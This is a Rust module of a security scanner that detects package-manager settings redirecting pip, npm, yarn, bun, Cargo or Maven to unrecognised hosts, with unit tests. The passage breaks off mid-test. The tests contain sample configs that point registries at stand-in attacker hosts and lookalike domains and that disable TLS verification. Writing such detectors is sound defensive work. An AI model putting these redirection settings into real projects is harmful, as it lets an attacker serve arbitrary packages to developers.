//! Dependency source redirection (`DEPSRC-001` .. `DEPSRC-007`).
//!
//! A package-manager setting that points `pip` or `npm` somewhere other than
//! the public registry changes where *every* dependency comes from: the host
//! it names can serve any package under any name. Regex rules can find the
//! setting but not judge the host — a `safe_domains` substring suppression is
//! defeated by `https://registry.npmjs.org.evil.example/` — so this module
//! parses the destination and classifies the host itself.
//!
//! | Rule | Severity | Surface |
//! |---|---|---|
//! | `DEPSRC-001` | High | A config file *replaces* the default registry or index with an unrecognised host |
//! | `DEPSRC-002` | High | A config file *adds* an extra index or find-links source on an unrecognised host (dependency confusion: pip takes the highest version across all indexes) |
//! | `DEPSRC-003` | Medium | A config file routes one npm scope, or explicitly-pinned packages, to an unrecognised host |
//! | `DEPSRC-004` | Medium | A config file turns off TLS verification for package downloads |
//! | `DEPSRC-005` | High | A dependency is fetched directly from a URL on an unrecognised host |
//! | `DEPSRC-006` | Medium | An install command in instructions or a script points pip / npm / uv / yarn / poetry at an unrecognised index |
//! | `DEPSRC-007` | High | A package source is fetched over plaintext `http://` |
//!
//! "Unrecognised" means not the ecosystem default, not a well-known vendor
//! index (PyTorch, NVIDIA), not a public mirror of the default registry, and
//! not a loopback or private-network address. The vendor list is deliberately
//! short: routine vendor indexes appear in clean skills (`pypi.nvidia.com` in
//! eleven NVIDIA skill files), and the severity policy keeps routine idioms
//! out of the verdict.

use super::bytecode::finding;
use super::{Evidence, Finding, Phase, Severity};

pub const RULE_REPLACE: &str = "DEPSRC-001";
pub const RULE_ADD: &str = "DEPSRC-002";
pub const RULE_SCOPED: &str = "DEPSRC-003";
pub const RULE_TLS_OFF: &str = "DEPSRC-004";
pub const RULE_DIRECT_URL: &str = "DEPSRC-005";
pub const RULE_COMMAND: &str = "DEPSRC-006";
pub const RULE_PLAINTEXT: &str = "DEPSRC-007";

/// Longest line read for commands; longer lines are minified data.
const MAX_LINE: usize = 4096;

const DEFAULT_HOSTS: &[&str] = &[
    "pypi.org",
    "pypi.python.org",
    "files.pythonhosted.org",
    "registry.npmjs.org",
    "registry.npmjs.com",
    "registry.yarnpkg.com",
    "index.crates.io",
    "static.crates.io",
    "crates.io",
    "repo.maven.apache.org",
    "repo1.maven.org",
];

/// Public mirrors of the default registries and vendor indexes whose
/// packages are the vendor's own. Suffix-matched on a label boundary.
const KNOWN_HOST_SUFFIXES: &[&str] = &[
    "download.pytorch.org",
    "pytorch.org",
    "nvidia.com",
    "data.pyg.org",
    "jetson-ai-lab.io",
    "jetson-ai-lab.dev",
    "registry.npmmirror.com",
    "npmmirror.com",
    "pypi.tuna.tsinghua.edu.cn",
    "mirrors.tuna.tsinghua.edu.cn",
    "mirrors.aliyun.com",
    "mirrors.cloud.tencent.com",
    "repo.huaweicloud.com",
    "pypi.mirrors.ustc.edu.cn",
    "maven.google.com",
    "dl.google.com",
    "plugins.gradle.org",
];

/// Code forges: a direct git/tarball dependency from one of these bypasses
/// the registry but is the ordinary way to depend on unreleased code, and
/// SUPPLY-003 already reports the branch-pinned form.
const FORGE_HOSTS: &[&str] = &[
    "github.com",
    "codeload.github.com",
    "gitlab.com",
    "bitbucket.org",
    "codeberg.org",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum HostClass {
    Default,
    Known,
    Forge,
    Local,
    Other,
}

/// A parsed destination.
#[derive(Debug, Clone)]
pub struct Destination {
    pub class: HostClass,
    pub plaintext: bool,
    /// The URL with any userinfo replaced, safe to print.
    pub display: String,
}

fn suffix_match(host: &str, suffix: &str) -> bool {
    host == suffix || host.ends_with(&format!(".{suffix}"))
}

fn is_private_host(host: &str) -> bool {
    if matches!(host, "localhost" | "0.0.0.0" | "::1" | "[::1]")
        || host.ends_with(".localhost")
        || host.ends_with(".local")
        || host.ends_with(".internal")
        || host.ends_with(".lan")
        || host.ends_with(".home.arpa")
    {
        return true;
    }
    let octets: Vec<u8> = host.split('.').filter_map(|p| p.parse().ok()).collect();
    if octets.len() == 4 && host.split('.').count() == 4 {
        return matches!(
            (octets[0], octets[1]),
            (127, _) | (10, _) | (192, 168) | (169, 254)
        ) || (octets[0] == 172 && (16..=31).contains(&octets[1]));
    }
    false
}

/// Parse a URL-ish destination. `None` when it is not a URL (a bare name, an
/// unresolved `$VARIABLE`, a relative path).
pub fn parse_destination(raw: &str) -> Option<Destination> {
    let raw = raw
        .trim()
        .trim_matches(|c| c == '"' || c == '\'' || c == '`');
    let (scheme, rest) = raw.split_once("://")?;
    let scheme = scheme.to_ascii_lowercase();
    let scheme_base = scheme.rsplit('+').next().unwrap_or(&scheme);
    if !matches!(scheme_base, "http" | "https" | "ssh" | "git") {
        return None;
    }
    let authority = rest.split(['/', '?', '#']).next().unwrap_or("");
    let (userinfo, hostport) = match authority.rsplit_once('@') {
        Some((u, h)) => (Some(u), h),
        None => (None, authority),
    };
    // `git+ssh://git@github.com:org/repo` puts a path after a colon.
    let host = if hostport.starts_with('[') {
        hostport.split(']').next().unwrap_or("").to_string() + "]"
    } else {
        hostport.split(':').next().unwrap_or("").to_string()
    }
    .to_ascii_lowercase();
    if host.is_empty() || host.contains('$') || host.contains('{') {
        return None;
    }
    let class = if DEFAULT_HOSTS.contains(&host.as_str()) {
        HostClass::Default
    } else if is_private_host(&host) {
        HostClass::Local
    } else if KNOWN_HOST_SUFFIXES.iter().any(|s| suffix_match(&host, s)) {
        HostClass::Known
    } else if FORGE_HOSTS.contains(&host.as_str()) {
        HostClass::Forge
    } else {
        HostClass::Other
    };
    let display = match userinfo {
        Some(u) => raw.replacen(&format!("{u}@"), "***@", 1),
        None => raw.to_string(),
    };
    let display: String = display.chars().take(160).collect();
    Some(Destination {
        class,
        plaintext: scheme_base == "http" && class != HostClass::Local,
        display,
    })
}

/// What a setting does to resolution.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Op {
    Replace,
    Add,
    Scoped,
}

/// The outcome for one destination on one surface, if it deserves a finding.
fn judge(
    dest: &Destination,
    op: Op,
    config: bool,
    what: &str,
) -> Option<(&'static str, Severity, u32, String)> {
    if dest.plaintext {
        return Some((
            RULE_PLAINTEXT,
            Severity::High,
            3,
            format!(
                "{what} fetches packages over plaintext HTTP from {} — anyone on the path \
                 can substitute any package",
                dest.display
            ),
        ));
    }
    if dest.class != HostClass::Other {
        return None;
    }
    if !config {
        return Some((
            RULE_COMMAND,
            Severity::Medium,
            2,
            format!(
                "{what} points the package manager at {} — a host that is not the default \
                 registry or a known vendor index; running it installs whatever that host serves",
                dest.display
            ),
        ));
    }
    Some(match op {
        Op::Replace => (
            RULE_REPLACE,
            Severity::High,
            3,
            format!(
                "{what} replaces the default registry with {} — every dependency resolves \
                 through that host",
                dest.display
            ),
        ),
        Op::Add => (
            RULE_ADD,
            Severity::High,
            3,
            format!(
                "{what} adds {} as an extra package source — a package of the same name \
                 with a higher version there wins (dependency confusion)",
                dest.display
            ),
        ),
        Op::Scoped => (
            RULE_SCOPED,
            Severity::Medium,
            2,
            format!(
                "{what} routes a package scope to {} — only that scope is affected",
                dest.display
            ),
        ),
    })
}

struct Out<'a> {
    file: &'a str,
    findings: Vec<Finding>,
}

impl Out<'_> {
    fn push(&mut self, line: usize, verdict: Option<(&'static str, Severity, u32, String)>) {
        if let Some((rule, severity, weight, snippet)) = verdict {
            // One finding per rule per line.
            if self
                .findings
                .iter()
                .any(|f| f.rule == rule && f.line == Some(line))
            {
                return;
            }
            let mut f = finding(
                Phase::NetworkExfil,
                rule,
                severity,
                self.file,
                snippet,
                weight,
                Evidence::Standalone,
            );
            f.line = Some(line);
            self.findings.push(f);
        }
    }
    fn dest(&mut self, line: usize, raw: &str, op: Op, config: bool, what: &str) {
        if let Some(d) = parse_destination(raw) {
            let v = judge(&d, op, config, what);
            self.push(line, v);
        }
    }
    fn tls_off(&mut self, line: usize, what: &str) {
        let mut f = finding(
            Phase::NetworkExfil,
            RULE_TLS_OFF,
            Severity::Medium,
            self.file,
            format!("{what} disables TLS verification for package downloads"),
            2,
            Evidence::Standalone,
        );
        f.line = Some(line);
        self.findings.push(f);
    }
    fn direct(&mut self, line: usize, raw: &str, what: &str) {
        let Some(d) = parse_destination(raw) else {
            return;
        };
        if d.plaintext {
            let v = judge(&d, Op::Add, true, what);
            self.push(line, v);
        } else if d.class == HostClass::Other {
            self.push(
                line,
                Some((
                    RULE_DIRECT_URL,
                    Severity::High,
                    3,
                    format!(
                        "{what} is fetched directly from {} — outside any registry, with no \
                         immutability or provenance guarantee",
                        d.display
                    ),
                )),
            );
        }
    }
}

fn strip_comment<'a>(line: &'a str, markers: &[char]) -> &'a str {
    // A `#` inside a URL fragment (`...#egg=x`) is preceded by non-space.
    let mut prev = ' ';
    for (i, c) in line.char_indices() {
        if markers.contains(&c) && (prev.is_whitespace() || i == 0) {
            return &line[..i];
        }
        prev = c;
    }
    line
}

fn unquote(v: &str) -> &str {
    v.trim()
        .trim_end_matches(',')
        .trim()
        .trim_matches(|c| c == '"' || c == '\'')
}

/// `key = value` / `key: value` / `key value` split for rc and TOML files.
fn kv(line: &str) -> Option<(&str, &str)> {
    let l = line.trim();
    if let Some((k, v)) = l.split_once('=') {
        return Some((k.trim(), v.trim()));
    }
    if let Some((k, v)) = l.split_once(':') {
        // `npmRegistryServer: "https://..."` — but not a URL's own colon.
        if !k.contains('/') && !k.contains(' ') {
            return Some((k.trim(), v.trim()));
        }
    }
    l.split_once(char::is_whitespace)
        .map(|(k, v)| (k.trim(), v.trim()))
}

fn is_false(v: &str) -> bool {
    matches!(
        unquote(v).to_ascii_lowercase().as_str(),
        "false" | "0" | "no"
    )
}

fn npmrc(text: &str, out: &mut Out) {
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#', ';']);
        let Some((k, v)) = kv(line) else { continue };
        let key = k.to_ascii_lowercase();
        if key == "registry" {
            out.dest(i + 1, unquote(v), Op::Replace, true, ".npmrc registry");
        } else if key.starts_with('@') && key.ends_with(":registry") {
            out.dest(
                i + 1,
                unquote(v),
                Op::Scoped,
                true,
                ".npmrc scoped registry",
            );
        } else if key == "strict-ssl" && is_false(v) {
            out.tls_off(i + 1, ".npmrc strict-ssl=false");
        }
    }
}

fn yarnrc(text: &str, yml: bool, out: &mut Out) {
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#']);
        let indented = line.starts_with(' ') || line.starts_with('\t');
        let Some((k, v)) = kv(line) else { continue };
        let key = k.trim_matches('"').to_ascii_lowercase();
        match key.as_str() {
            "registry" | "npmregistryserver" => {
                let op = if yml && indented {
                    Op::Scoped
                } else {
                    Op::Replace
                };
                out.dest(i + 1, unquote(v), op, true, "yarn registry");
            }
            "strict-ssl" | "enablestrictssl" if is_false(v) => {
                out.tls_off(i + 1, "yarn strict SSL off");
            }
            _ => {}
        }
    }
}

/// Values of a pip option, including INI continuation lines.
fn pip_conf(text: &str, out: &mut Out) {
    let mut current: Option<(&str, Op)> = None;
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#', ';']);
        if line.trim().is_empty() {
            continue;
        }
        let continuation = raw.starts_with(' ') || raw.starts_with('\t');
        if continuation {
            if let Some((what, op)) = current {
                if what == "trusted-host" {
                    out.tls_off(i + 1, "pip.conf trusted-host");
                } else {
                    out.dest(i + 1, line.trim(), op, true, what);
                }
            }
            continue;
        }
        current = None;
        let Some((k, v)) = kv(line) else { continue };
        let key = k.to_ascii_lowercase().replace('_', "-");
        let (what, op) = match key.as_str() {
            "index-url" | "index" => ("pip.conf index-url", Op::Replace),
            "extra-index-url" => ("pip.conf extra-index-url", Op::Add),
            "find-links" => ("pip.conf find-links", Op::Add),
            "trusted-host" => {
                if !v.is_empty() {
                    out.tls_off(i + 1, "pip.conf trusted-host");
                }
                current = Some(("trusted-host", Op::Add));
                continue;
            }
            _ => continue,
        };
        current = Some((what, op));
        for part in v.split_whitespace() {
            out.dest(i + 1, part, op, true, what);
        }
    }
}

fn requirements(text: &str, out: &mut Out) {
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#']).trim();
        if line.is_empty() {
            continue;
        }
        let tokens: Vec<&str> = line
            .split(|c: char| c.is_whitespace() || c == '=')
            .filter(|t| !t.is_empty())
            .collect();
        let mut j = 0;
        let mut option = false;
        while j < tokens.len() {
            let t = tokens[j];
            let next = tokens.get(j + 1).copied().unwrap_or("");
            match t {
                "-i" | "--index-url" => {
                    option = true;
                    out.dest(i + 1, next, Op::Replace, true, "requirements --index-url");
                }
                "--extra-index-url" => {
                    option = true;
                    out.dest(i + 1, next, Op::Add, true, "requirements --extra-index-url");
                }
                "-f" | "--find-links" => {
                    option = true;
                    out.dest(i + 1, next, Op::Add, true, "requirements --find-links");
                }
                "--trusted-host" => {
                    option = true;
                    out.tls_off(i + 1, "requirements --trusted-host");
                }
                _ => {}
            }
            j += 1;
        }
        if option {
            continue;
        }
        // A requirement: `name @ URL`, a bare URL, or `-e git+URL`.
        if let Some(url) = line
            .split_whitespace()
            .find(|t| t.contains("://"))
            .map(|t| t.trim_start_matches("-e"))
        {
            out.direct(i + 1, url, "requirement");
        }
    }
}

/// Current `[section]` of a TOML-ish file, tracked line by line (no TOML
/// parser is linked; these files are scanned for a handful of keys).
fn toml_section(line: &str) -> Option<String> {
    let t = line.trim();
    if t.starts_with('[') && t.ends_with(']') {
        Some(
            t.trim_matches(|c| c == '[' || c == ']')
                .trim()
                .to_ascii_lowercase(),
        )
    } else {
        None
    }
}

/// Every `"scheme://..."` literal on a line.
fn quoted_urls(line: &str) -> Vec<&str> {
    line.split(['"', '\''])
        .filter(|s| s.contains("://"))
        .collect()
}

fn pyproject(text: &str, name: &str, out: &mut Out) {
    let mut section = String::new();
    // For array-of-table sources: remember the url line until the table ends
    // so `default = true` / `priority = "primary"` can decide the operation.
    let mut pending: Option<(usize, String, Op, &str)> = None;
    let flush = |pending: &mut Option<(usize, String, Op, &str)>, out: &mut Out| {
        if let Some((line, url, op, what)) = pending.take() {
            out.dest(line, &url, op, true, what);
        }
    };
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#']);
        if let Some(s) = toml_section(line) {
            flush(&mut pending, out);
            section = s;
            continue;
        }
        let Some((k, v)) = kv(line) else {
            // Array continuation lines inside a dependency list.
            if section == "project" || section.starts_with("project.optional-dependencies") {
                for u in quoted_urls(line) {
                    if let Some((_, url)) = u.split_once('@') {
                        out.direct(i + 1, url.trim(), "dependency");
                    }
                }
            }
            continue;
        };
        let key = k.trim_matches('"').to_ascii_lowercase();
        let value = unquote(v);
        match section.as_str() {
            "tool.uv.index" | "index" | "tool.pdm.source" | "source" | "tool.poetry.source" => {
                if key == "url" {
                    let (op, what) = match section.as_str() {
                        "tool.poetry.source" => (Op::Add, "poetry source"),
                        "tool.pdm.source" => (Op::Add, "pdm source"),
                        "source" => (Op::Add, "Pipfile [[source]]"),
                        _ => (Op::Add, "uv index"),
                    };
                    pending = Some((i + 1, value.to_string(), op, what));
                } else if let Some((_, _, op, _)) = pending.as_mut() {
                    let val = value.to_ascii_lowercase();
                    if (key == "default" && val == "true")
                        || (key == "priority" && matches!(val.as_str(), "primary" | "default"))
                    {
                        *op = Op::Replace;
                    } else if key == "explicit" && val == "true"
                        || key == "priority" && val == "explicit"
                    {
                        *op = Op::Scoped;
                    }
                } else if key == "verify_ssl" && is_false(v) {
                    out.tls_off(i + 1, "Pipfile verify_ssl = false");
                }
                if key == "verify_ssl" && is_false(v) && pending.is_some() {
                    out.tls_off(i + 1, "Pipfile verify_ssl = false");
                }
            }
            "tool.uv" | "tool.uv.pip" => match key.as_str() {
                "index-url" | "default-index" => {
                    out.dest(i + 1, value, Op::Replace, true, "uv index-url")
                }
                "extra-index-url" | "find-links" => {
                    for u in quoted_urls(v) {
                        out.dest(i + 1, u, Op::Add, true, "uv extra-index-url");
                    }
                }
                "allow-insecure-host" => out.tls_off(i + 1, "uv allow-insecure-host"),
                _ => {}
            },
            s if s == "project"
                || s.starts_with("project.optional-dependencies")
                || s == "dependency-groups" =>
            {
                for u in quoted_urls(line) {
                    if let Some((_, url)) = u.split_once('@') {
                        out.direct(i + 1, url.trim(), "dependency");
                    }
                }
            }
            s if s.ends_with("dependencies")
                || s == "tool.uv.sources"
                || s == "packages"
                || s == "dev-packages" =>
            {
                // `pkg = { git = "...", url = "...", file = "..." }`
                for u in quoted_urls(v) {
                    out.direct(i + 1, u, "dependency");
                }
            }
            "global" if name == "uv.toml" => {}
            "" if name == "uv.toml" => match key.as_str() {
                "index-url" | "default-index" => {
                    out.dest(i + 1, value, Op::Replace, true, "uv.toml index-url")
                }
                "extra-index-url" | "find-links" => {
                    for u in quoted_urls(v) {
                        out.dest(i + 1, u, Op::Add, true, "uv.toml extra-index-url");
                    }
                }
                _ => {}
            },
            _ => {}
        }
    }
    flush(&mut pending, out);
}

fn bunfig(text: &str, out: &mut Out) {
    let mut section = String::new();
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#']);
        if let Some(s) = toml_section(line) {
            section = s;
            continue;
        }
        let Some((k, v)) = kv(line) else { continue };
        let key = k.trim_matches('"').to_ascii_lowercase();
        let urls = quoted_urls(v);
        match section.as_str() {
            "install" if key == "registry" => {
                for u in urls {
                    out.dest(i + 1, u, Op::Replace, true, "bunfig registry");
                }
            }
            "install.scopes" => {
                for u in urls {
                    out.dest(i + 1, u, Op::Scoped, true, "bunfig scoped registry");
                }
            }
            _ => {}
        }
    }
}

/// `.cargo/config.toml`: `[source.*]` entries replace crates.io (they only
/// exist to be the target of a `replace-with`); `[registries.*]` add a named
/// registry that only dependencies naming it use.
fn cargo_config(text: &str, out: &mut Out) {
    let mut section = String::new();
    for (i, raw) in text.lines().enumerate() {
        let line = strip_comment(raw, &['#']);
        if let Some(s) = toml_section(line) {
            section = s;
            continue;
        }
        let Some((k, v)) = kv(line) else { continue };
        let key = k.trim_matches('"').to_ascii_lowercase();
        if section.starts_with("source.") && matches!(key.as_str(), "registry" | "index") {
            out.dest(
                i + 1,
                unquote(v),
                Op::Replace,
                true,
                "Cargo source replacement",
            );
        } else if section.starts_with("registries.") && key == "index" {
            out.dest(
                i + 1,
                unquote(v),
                Op::Scoped,
                true,
                "Cargo alternative registry",
            );
        } else if section == "http" && key == "check-revoke" && is_false(v) {
            out.tls_off(i + 1, "Cargo http.check-revoke = false");
        }
    }
}

/// Maven `settings.xml` / `pom.xml`: a `<mirror>` URL replaces the central
/// repository; a `<repository>` or `<pluginRepository>` URL adds one. The
/// enclosing element is found by looking back from each `<url>`, so one-line
/// and pretty-printed XML read the same.
fn maven(text: &str, out: &mut Out) {
    let mut from = 0;
    while let Some(pos) = text[from..].find("<url>") {
        let start = from + pos + "<url>".len();
        let Some(len) = text[start..].find("</url>") else {
            break;
        };
        let url = text[start..start + len].trim();
        let before = &text[..start];
        let last = |tag: &str| before.rfind(tag).map(|p| p as i64).unwrap_or(-1);
        let in_mirror = last("<mirror>") > last("</mirror>");
        let in_repo = last("<repository>") > last("</repository>")
            || last("<pluginRepository>") > last("</pluginRepository>");
        let line = line_at(text, start);
        if in_mirror {
            out.dest(line, url, Op::Replace, true, "Maven mirror");
        } else if in_repo {
            out.dest(line, url, Op::Add, true, "Maven repository");
        }
        from = start + len;
    }
}

fn line_at(text: &str, offset: usize) -> usize {
    text.as_bytes()[..offset]
        .iter()
        .filter(|b| **b == b'\n')
        .count()
        + 1
}

fn package_json(text: &str, out: &mut Out) {
    let Ok(doc) = serde_json::from_str::<serde_json::Value>(text) else {
        return;
    };
    for section in [
        "dependencies",
        "devDependencies",
        "optionalDependencies",
        "peerDependencies",
        "bundledDependencies",
        "overrides",
        "resolutions",
    ] {
        let Some(map) = doc.get(section).and_then(|v| v.as_object()) else {
            continue;
        };
        for (name, spec) in map {
            let Some(spec) = spec.as_str() else { continue };
            if !spec.contains("://") {
                continue;
            }
            // Line of the spec in the original text, for the reader.
            let needle = format!("\"{name}\"");
            let line = text
                .lines()
                .position(|l| l.contains(&needle) && l.contains(spec))
                .map(|p| p + 1)
                .unwrap_or(1);
            out.direct(line, spec, &format!("npm dependency {name}"));
        }
    }
}

const ENV_KEYS: &[(&str, Op)] = &[
    ("pip_index_url", Op::Replace),
    ("pip_extra_index_url", Op::Add),
    ("pip_find_links", Op::Add),
    ("uv_index_url", Op::Replace),
    ("uv_default_index", Op::Replace),
    ("uv_extra_index_url", Op::Add),
    ("uv_index", Op::Add),
    ("npm_config_registry", Op::Replace),
    ("yarn_npm_registry_server", Op::Replace),
];

/// Words without which a line cannot carry a dependency-source setting. One
/// case-insensitive search over the whole file decides whether any line is
/// read at all, so the common file costs a single literal scan.
fn trigger() -> &'static regex::Regex {
    static RE: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    RE.get_or_init(|| {
        regex::Regex::new(
            r"(?i)index|registr|find-links|source add|maven\.repo|\bpip3?\s.*\s-[if]\b",
        )
        .expect("static pattern")
    })
}

/// Commands and env assignments in instructions and scripts.
fn commands(text: &str, markdown_like: bool, out: &mut Out) {
    if !trigger().is_match(text) {
        return;
    }
    for (i, raw) in text.lines().enumerate() {
        if raw.len() > MAX_LINE || !trigger().is_match(raw) {
            continue;
        }
        let tokens: Vec<&str> = raw
            .split(|c: char| {
                c.is_whitespace()
                    || matches!(
                        c,
                        '"' | '\'' | '`' | ',' | '[' | ']' | '(' | ')' | '=' | ';'
                    )
            })
            .filter(|t| !t.is_empty())
            .collect();
        let pip_context = tokens.iter().any(|t| {
            let t = t.to_ascii_lowercase();
            matches!(t.as_str(), "pip" | "pip3" | "uv" | "pipx")
                || t.ends_with("/pip")
                || t.ends_with("/pip3")
        });
        let line = i + 1;
        for (j, t) in tokens.iter().enumerate() {
            let tl = t.to_ascii_lowercase();
            let next = tokens.get(j + 1).copied().unwrap_or("");
            let op = match tl.as_str() {
                "--index-url" | "--default-index" => {
                    Some((Op::Replace, "install command --index-url"))
                }
                "-i" if pip_context => Some((Op::Replace, "pip -i")),
                "--extra-index-url" | "--index" => {
                    Some((Op::Add, "install command --extra-index-url"))
                }
                "--find-links" => Some((Op::Add, "install command --find-links")),
                "-f" if pip_context => Some((Op::Add, "pip -f")),
                "--registry" => Some((Op::Replace, "install command --registry")),
                "-dmaven.repo.remote" => Some((Op::Replace, "mvn -Dmaven.repo.remote")),
                env if env.starts_with("cargo_registries_") && env.ends_with("_index") => {
                    Some((Op::Scoped, "CARGO_REGISTRIES_*_INDEX"))
                }
                _ => ENV_KEYS
                    .iter()
                    .find(|(k, _)| tl.trim_start_matches('$') == *k)
                    .map(|(_, op)| (*op, "package-manager environment variable")),
            };
            if let Some((op, what)) = op {
                // `uv add --index name=url` puts the URL one token later.
                let target = if parse_destination(next).is_none() {
                    tokens.get(j + 2).copied().unwrap_or("")
                } else {
                    next
                };
                out.dest(line, target, op, false, what);
                continue;
            }
            // `npm|yarn|pip config set <key> <url>`
            if tl == "config"
                && tokens.get(j + 1).map(|s| s.to_ascii_lowercase()) == Some("set".into())
            {
                let key = tokens
                    .get(j + 2)
                    .copied()
                    .unwrap_or("")
                    .to_ascii_lowercase();
                let val = tokens.get(j + 3).copied().unwrap_or("");
                if key == "registry"
                    || key.ends_with(":registry")
                    || key.ends_with("index-url")
                    || key == "npmregistryserver"
                {
                    out.dest(line, val, Op::Replace, false, "config set");
                }
            }
            // `poetry source add [--priority=x] <name> <url>`
            if tl == "source"
                && tokens.get(j + 1).map(|s| s.to_ascii_lowercase()) == Some("add".into())
            {
                if let Some(url) = tokens[j + 2..].iter().find(|t| t.contains("://")) {
                    out.dest(line, url, Op::Add, false, "poetry source add");
                }
            }
        }
        // An .npmrc snippet quoted in documentation: `registry=https://...`.
        if markdown_like {
            let t = raw.trim_start_matches(|c: char| c.is_whitespace() || c == '>');
            if let Some((k, v)) = t.split_once('=') {
                let k = k.trim().to_ascii_lowercase();
                if k == "registry" || (k.starts_with('@') && k.ends_with(":registry")) {
                    out.dest(line, v.trim(), Op::Replace, false, ".npmrc snippet");
                }
            }
        }
    }
}

/// Files read as package-manager configuration, by basename.
fn config_kind(name: &str) -> Option<&'static str> {
    let lower = name.to_ascii_lowercase();
    Some(match lower.as_str() {
        ".npmrc" | "npmrc" => "npmrc",
        ".yarnrc" => "yarnrc",
        ".yarnrc.yml" | ".yarnrc.yaml" => "yarnrc.yml",
        "pip.conf" | "pip.ini" => "pip",
        "pyproject.toml" | "pipfile" | "uv.toml" | "pdm.toml" => "toml",
        "bunfig.toml" => "bunfig",
        "package.json" => "package.json",
        _ if (lower.starts_with("requirements") || lower.starts_with("constraints"))
            && (lower.ends_with(".txt") || lower.ends_with(".in")) =>
        {
            "requirements"
        }
        _ => return None,
    })
}

/// Files whose lines may carry install commands.
fn command_surface(name: &str) -> Option<bool> {
    let lower = name.to_ascii_lowercase();
    let ext = lower.rsplit_once('.').map(|(_, e)| e).unwrap_or("");
    match ext {
        "md" | "mdx" | "markdown" | "txt" | "rst" | "mdc" => Some(true),
        "sh" | "bash" | "zsh" | "ps1" | "bat" | "cmd" | "py" | "js" | "mjs" | "cjs" | "ts"
        | "yml" | "yaml" | "json" | "toml" | "cfg" | "ini" => Some(false),
        _ if matches!(lower.as_str(), "dockerfile" | "containerfile" | "makefile")
            || lower.starts_with("dockerfile.") =>
        {
            Some(false)
        }
        _ => None,
    }
}

/// Every dependency-source finding for one file.
pub fn scan_file(rel_path: &str, contents: &str) -> Vec<Finding> {
    let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
    let mut out = Out {
        file: rel_path,
        findings: Vec::new(),
    };
    let lname = name.to_ascii_lowercase();
    if rel_path.rsplit('/').nth(1) == Some(".cargo")
        && matches!(lname.as_str(), "config.toml" | "config")
    {
        cargo_config(contents, &mut out);
        return out.findings;
    }
    if matches!(lname.as_str(), "settings.xml" | "pom.xml")
        && (contents.contains("<mirror")
            || contents.contains("<repositor")
            || contents.contains("<pluginRepositor"))
    {
        maven(contents, &mut out);
        return out.findings;
    }
    match config_kind(name) {
        Some("npmrc") => npmrc(contents, &mut out),
        Some("yarnrc") => yarnrc(contents, false, &mut out),
        Some("yarnrc.yml") => yarnrc(contents, true, &mut out),
        Some("pip") => pip_conf(contents, &mut out),
        Some("toml") => pyproject(contents, &name.to_ascii_lowercase(), &mut out),
        Some("bunfig") => bunfig(contents, &mut out),
        Some("package.json") => package_json(contents, &mut out),
        Some("requirements") => requirements(contents, &mut out),
        _ => {
            if let Some(markdown_like) = command_surface(name) {
                commands(contents, markdown_like, &mut out);
            }
        }
    }
    out.findings
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rules(path: &str, text: &str) -> Vec<(String, Severity)> {
        scan_file(path, text)
            .into_iter()
            .map(|f| (f.rule, f.severity))
            .collect()
    }

    fn has(path: &str, text: &str, rule: &str) -> bool {
        rules(path, text).iter().any(|(r, _)| r == rule)
    }

    #[test]
    fn host_classes() {
        let c = |u: &str| parse_destination(u).map(|d| d.class);
        assert_eq!(c("https://registry.npmjs.org/"), Some(HostClass::Default));
        assert_eq!(c("https://pypi.org/simple"), Some(HostClass::Default));
        assert_eq!(c("https://pypi.nvidia.com"), Some(HostClass::Known));
        assert_eq!(
            c("https://download.pytorch.org/whl/cu121"),
            Some(HostClass::Known)
        );
        assert_eq!(c("http://localhost:4873"), Some(HostClass::Local));
        assert_eq!(c("http://10.0.0.5/simple"), Some(HostClass::Local));
        assert_eq!(
            c("git+ssh://git@github.com:org/repo.git"),
            Some(HostClass::Forge)
        );
        // A default host as a *prefix* of an attacker domain is not default.
        assert_eq!(
            c("https://registry.npmjs.org.evil.example/"),
            Some(HostClass::Other)
        );
        assert_eq!(c("https://evil-nvidia.com/simple"), Some(HostClass::Other));
        assert_eq!(c("${PIP_INDEX}"), None);
        assert_eq!(c("nvcr.io"), None);
        let d = parse_destination("https://bot:tok3n@pkgs.example.com/simple").unwrap();
        assert!(!d.display.contains("tok3n"), "{}", d.display);
    }

    #[test]
    fn npmrc_redirects() {
        assert!(has(
            ".npmrc",
            "registry=https://npm.attacker.example/\n",
            RULE_REPLACE
        ));
        assert!(has(
            ".npmrc",
            "@acme:registry=https://npm.attacker.example/\n",
            RULE_SCOPED
        ));
        assert!(has(".npmrc", "strict-ssl=false\n", RULE_TLS_OFF));
        assert!(has(
            ".npmrc",
            "registry=http://npm.example.net/\n",
            RULE_PLAINTEXT
        ));
        // The default registry, a mirror, a comment: nothing.
        assert!(rules(".npmrc", "registry=https://registry.npmjs.org/\n").is_empty());
        assert!(rules(".npmrc", "registry=https://registry.npmmirror.com\n").is_empty());
        assert!(rules(".npmrc", "# registry=https://evil.example/\n").is_empty());
        assert!(rules(".npmrc", "//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n").is_empty());
    }

    #[test]
    fn yarn_and_bun() {
        assert!(has(
            ".yarnrc.yml",
            "npmRegistryServer: \"https://yarn.attacker.example\"\n",
            RULE_REPLACE
        ));
        assert!(has(
            ".yarnrc.yml",
            "npmScopes:\n  acme:\n    npmRegistryServer: \"https://yarn.attacker.example\"\n",
            RULE_SCOPED
        ));
        assert!(has(
            ".yarnrc",
            "registry \"https://yarn.attacker.example\"\n",
            RULE_REPLACE
        ));
        assert!(has(
            "bunfig.toml",
            "[install]\nregistry = \"https://bun.attacker.example/\"\n",
            RULE_REPLACE
        ));
        assert!(has(
            "bunfig.toml",
            "[install.scopes]\nacme = { url = \"https://bun.attacker.example/\" }\n",
            RULE_SCOPED
        ));
        assert!(rules(
            "bunfig.toml",
            "[install]\nregistry = \"https://registry.npmjs.org\"\n"
        )
        .is_empty());
    }

    #[test]
    fn pip_config_and_requirements() {
        assert!(has(
            "pip.conf",
            "[global]\nindex-url = https://pypi.attacker.example/simple\n",
            RULE_REPLACE
        ));
        assert!(has(
            "pip.ini",
